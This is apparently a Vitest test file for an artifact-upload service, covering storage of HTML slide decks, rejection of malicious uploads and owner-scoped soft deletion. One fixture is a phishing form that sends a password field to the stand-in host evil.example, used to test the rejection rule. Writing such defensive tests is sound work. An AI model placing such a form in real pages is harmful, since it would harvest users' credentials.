import { describe, it, expect, afterAll } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { drizzle } from "drizzle-orm/better-sqlite3";
import { migrate } from "drizzle-orm/better-sqlite3/migrator";
import { createSqlite } from "@/db/sqlite";
import * as schema from "@/db/schema";
import { DiskStorage } from "@/lib/storage/disk";
import {
  createArtifact,
  listArtifacts,
  softDeleteArtifact,
} from "@/lib/artifacts";

const dir = mkdtempSync(join(tmpdir(), "artifact-room-art-"));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

function freshDb() {
  const sqlite = createSqlite(":memory:");
  const db = drizzle(sqlite, { schema });
  migrate(db, { migrationsFolder: "./db/migrations" });
  return db;
}

const cleanHtml = `<!doctype html><html><body><h1>Deck</h1><div data-slide></div><div data-slide></div></body></html>`;
const phishingHtml = `<html><body><form action="https://evil.example/login"><input type="password"></form></body></html>`;

describe("createArtifact", () => {
  it("stores a clean artifact (bytes + row) and parses slide count", async () => {
    const db = freshDb();
    const storage = new DiskStorage(join(dir, "clean"));

    const res = await createArtifact(
      { ownerId: "creator-1", title: "My Deck", bytes: Buffer.from(cleanHtml) },
      { db, storage },
    );

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.slideCount).toBe(2);

    const rows = listArtifacts("creator-1", { db });
    expect(rows).toHaveLength(1);
    expect(rows[0].ownerId).toBe("creator-1");

    // Bytes are stored UNMODIFIED.
    const blob = await storage.get(rows[0].storageKey);
    expect(blob?.data.toString("utf8")).toBe(cleanHtml);
  });

  it("rejects a malicious artifact and stores NOTHING", async () => {
    const db = freshDb();
    const storage = new DiskStorage(join(dir, "evil"));

    const res = await createArtifact(
      { ownerId: "creator-1", title: "Bad", bytes: Buffer.from(phishingHtml) },
      { db, storage },
    );

    expect(res).toMatchObject({ ok: false, rule: "external-form" });
    expect(listArtifacts("creator-1", { db })).toHaveLength(0);
  });

  it("soft-delete is owner-scoped", async () => {
    const db = freshDb();
    const storage = new DiskStorage(join(dir, "del"));
    const res = await createArtifact(
      { ownerId: "creator-1", title: "X", bytes: Buffer.from(cleanHtml) },
      { db, storage },
    );
    expect(res.ok).toBe(true);
    if (!res.ok) return;

    // A different owner cannot delete it.
    expect(softDeleteArtifact("intruder", res.id, { db })).toBe(false);
    expect(listArtifacts("creator-1", { db })).toHaveLength(1);

    // The owner can.
    expect(softDeleteArtifact("creator-1", res.id, { db })).toBe(true);
    expect(listArtifacts("creator-1", { db })).toHaveLength(0);
  });
});
